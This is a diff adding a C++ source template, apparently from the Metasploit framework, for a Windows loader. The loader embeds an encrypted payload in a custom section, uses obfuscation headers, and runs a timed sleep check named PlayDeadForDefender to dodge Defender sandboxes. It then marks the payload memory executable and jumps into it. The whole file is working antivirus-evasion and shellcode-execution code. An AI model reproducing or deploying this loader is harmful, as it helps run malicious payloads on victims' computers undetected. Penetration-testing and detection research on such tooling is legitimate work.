@@ -1,0 +1,65 @@
+#include <iostream>
+#include <windows.h>
+
+#include "<%= File.join(Msf::Config.data_directory, 'headers', 'windows', 'rc4.h') %>"
+
+#include "<%= File.join(Msf::Config.data_directory, 'headers', 'windows', 'obfusheader.h') %>"
+
+// TODO: currently, the encrypted payload is stored both in custom section AND .rdata - that is due to fact that bPayload is set by __attribute__ to be stored in custom section, but the class member, which is contains encrypted payload, is stored in .rdata as it is class instance. This would need to be solved by future metasploit developer and have 
+
+auto bPayload __attribute__((used)) __attribute__((section("<%= section_name %>"))) = <%= payload_declaration %>;
+
+
+int PlayDeadForDefender()
+{
+
+    DWORD               dwMilliSeconds        = <%=  random_sleep %>;
+	  LARGE_INTEGER       DelayInterval         = { 0 }; 
+	  LONGLONG            Delay                 = 0; 
+    NTSTATUS            STATUS                = 0;
+    DWORD               _T0                   = 0, 
+                        _T1                   = 0;
+        
+    Delay = dwMilliSeconds * 10000;
+	  DelayInterval.QuadPart = - Delay;
+
+    _T0 = GetTickCount();
+    
+    STATUS = CALL_EXPORT_X86("ntdll.dll", "NtDelayExecution", int(*)(BOOLEAN, PLARGE_INTEGER), FALSE, &DelayInterval);
+    if (STATUS != 0) {
+      return 0;
+    }
+    
+    _T1 = GetTickCount();
+
+    if (_T1 - _T0 < dwMilliSeconds) {
+        return 0;
+    }
+
+    return 1;
+}
+
+
+int main() {
+
+    DWORD dwOldProtect;
+
+    unsigned long scsize = <%= payload_length %>;
+    
+    if( !CALL(&PlayDeadForDefender) )
+    {
+      return 1;
+    }
+
+    char * payload_fnc = (char*)bPayload;
+
+    if(!VirtualProtect(bPayload, scsize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
+    {
+      return 1;
+    }
+	
+    (*(void (*)()) payload_fnc)();
+
+	  return 0;
+}
+
